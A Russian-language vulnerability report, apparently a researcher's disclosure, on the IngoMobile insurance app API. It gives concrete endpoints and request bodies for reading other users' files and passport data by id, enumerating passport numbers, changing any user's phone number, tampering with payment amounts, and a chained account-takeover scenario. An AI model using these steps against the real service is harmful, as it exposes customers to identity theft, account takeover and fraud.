# IngoMobile уязвимости

Документ содержит уязвимости разной степени критичности.\
Самая критичная: ***доступ к паспортным данным пользователей***, несколькими способами.

## Бесконечное количество незавершенных регистраций

Шлем запрос на:
```https://ingomobile.ingos.ru/api/auth/create```

```json
{
  "last_name": "К",
  "first_name": "К",
  "middle_name": "К",
  "doc_series": "3214",
  "doc_num": "567890",
  "doc_date": "21.11.2018",
  "doc_issued_by": "12",
  "birthday": "21.12.1998",
  "city_id": "33209416",
  "mail": "c7015346@urhen.com"
}
```
Получаем в ответ что-то вроде:
```json
{
  "header": {
    "error_code": 0
  },
  "data": {
    "ais_user_id": "10596623603",
    "user_id": "628001203",
    "found": false
  }
}
```
где, \
```ais_user_id``` инкрементируется с каждым запросом ```10596637103, 10596637203, 10596637303``` 

```user_id``` тоже самое, ```628003003, 628003103, 628003203```
```mail``` - спокойно принимает значения вида ```"a@b.ru;c@d.ru;a@b.c"```

Из всех полей запроса, валидируется только ```last_name```.

## Код подтверждения регистрации

### Шлем смс с кодом подтверждения на любой номер

```https://ingomobile.ingos.ru/api/auth/send_code```

```json
{
  "ais_user_id": "10596623603",
  "user_id": "627952603",
  "phone": "79111111111"
}
```
где ```phone```  ***может быть любым***, смс приходит.

### Другие проблемы

1. Код можно выслать снова ```/auth/send_code``` и провалидировать ```/auth/check_code```, ***даже после успешной регистрации.***

2. После первой валидации и повторной отправке того же запроса, результат положительный, ***код не сбрасывается*** до истечения таймаута. Тоже самое для ```/auth/recovery/check_code```.

3. Любое количество регистраций ***на один номер телефона***. Запрашиваем новую регистрацию, подтверждаем используя отправку на любой номер.

## auth/recovery
Метод без проблем принимает запросы вида:
```json
{
  "full_name":"К К К",
  "phone": "trash_here_9137576122"
}
```

## Доступ к любому файлу по id

```https://ingomobile.ingos.ru/api/file/79344217903```
```https://ingomobile.ingos.ru/api/file/79344217203```
и так далее.\
Главное быть авторизованным с любого аккаунта.
Фото машин, ***паспортные данные***, данные машин, isn и т.д.

## Загрузка любого файла в качестве аватара
```https://ingomobile.ingos.ru/api/file/79344461803``` - php скрипт в качестве аватара.



## Изменение номера телефона

Метод ```auth/change_phone``` позволяет изменить номер телефона ***у любого пользователя*** по ```ais_user_id```, который поддается перебору.

## Возможность получить информацию о любом полисе

Права доступа к полису игнорируются, так же как и с файлами, главное быть авторизованным. \
```https://ingomobile.ingos.ru/api/1084159205803```

Проверено на ```policies/info/flat/``` и ```policies/info/travel/```, остальные скорее всего тоже уязвимы.


## Подмена суммы платежа

Метод ```payment/create``` позволяет ***подменить сумму платежа***, возможно и другие параметры.

## Получаем все зарегистрированные серии и номера паспорта
Посылаем запрос на ```/auth/create``` с несуществующим именем и интересующими серией и номером, получаем ошибку: \
```json
{
  "header": {
    "error_code": -20724,
    "error_message": "Ошибка поиска или создания карточки клиента в АИС (по паспорту рф с указанными серией и номером зарегистрирован клиент с другим фио.)"
  }
}
```
которая явно говорит нам о том, что серия и номер присутствуют в базе. Повторяем с другими данными.

## Узнаем серию и номер паспорта по ФИО
Ситуация схожа с предыдущим пунктом, только ФИО фиксированны, и мы перебираем пока не получим ```"found": true```.

## Получение доступа к пользовательскому аккаунту
### Сложный сценарий
Необходимо знать: ```last_name, first_name, middle_name, doc_series, doc_num```. 

```doc_series, doc_num``` - можно получить из предыдущего пункта.

Далее посылаем запрос на ```/auth/create``` и он возвращает нам ```ais_user_id``` и ```user_id``` жертвы, ```"found": true```.

#### Побочный эффект выполнения этого действия
В пользовательский аккаунт добавляется основным email, тот, что был передан в запросе. Хотя username не меняется, ***вход в систему начинает работать с переданным email***.

### Легкий сценарий
Перебираем файлы, получаем из них всю необходимую информацию.
### Общий сценарий
Для проведения атаки необходимы только два поля ```ais_user_id``` и ```full_name```.

### Получаем пароль
Так как мы уже получили ```ais_user_id``` и ```full_name``` дело за малым, меняем номер телефона жертвы на нужный и выполняем восстановления пароля. 




## payment/status/{id}
Метод также не проверяет права и возвращает информацию о платеже. Метод удаления не проверялся, дабы не навредить целостности данных, но скорее всего тоже уязвим.

## user/policies?ais_user_id={id}
Метод уязвим, пример: ```https://ingomobile.ingos.ru/api/user/policies?ais_user_id=4816247303```

## policies/info/bank_card/{id}
Метод возвращает разные ошибки:
```
Nullable object must have a value.

Вид страхование () не поддерживается функцией GETPOLICYFULLINFO
```
Не исключена возможность получить информацию о банковской карте.


## AisSessionId
```AisSessionId``` - продолжает работать даже после logout.

## P.S.
Также присутствуют краши и зависания сервера api, при некоторых запросах, неописанных в этом документе. \
Попытки инъекций были заблокированы файрволом. \
Возможны и другие уязвимости. 
Автор - [Николай Овчинников](https://kolsha.ru), [im@kolsha.ru](mailto:im@kolsha.ru) .